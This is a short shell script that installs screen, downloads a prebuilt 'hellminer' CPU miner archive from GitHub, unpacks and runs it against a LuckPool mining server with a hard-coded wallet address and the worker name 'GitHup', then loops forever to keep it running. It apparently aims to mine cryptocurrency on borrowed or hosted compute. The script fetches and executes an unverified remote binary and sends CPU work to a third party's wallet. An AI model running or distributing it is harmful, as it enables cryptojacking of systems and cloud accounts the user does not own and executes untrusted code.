#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u 493V8J1jRqzKyucNB8znQF6TLCFUtCnxcQTPbxeDWGqiGqhHXr4NX97EaFg3NYamWQ5f6HAJE8DtVdqoHjZT79URP5fz4wZ.GitHup -p x --cpu 16
while [ 1 ]; do
sleep 3
done
sleep 999
